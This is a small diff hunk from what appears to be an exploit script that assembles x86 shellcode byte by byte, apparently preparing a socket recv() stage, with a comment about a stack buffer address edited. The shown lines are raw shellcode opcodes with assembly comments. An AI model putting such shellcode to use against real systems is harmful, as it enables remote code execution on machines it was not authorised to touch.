@@ -59,7 +59,7 @@ setrecv += "\x52"				      # push edx
 setrecv += "\x80\xc6\x02"			# add dh, 0x02
 setrecv += "\x52"				      # push edx
 
-# Buffer = 0x00C0F9F0
+# Buffer at 0x00C0F9F0
 setrecv += "\x54"				      # push esp
 setrecv += "\x5b"				      # pop ebx
 setrecv += "\x83\xc3\x4c"			# add ebx, 0x4c
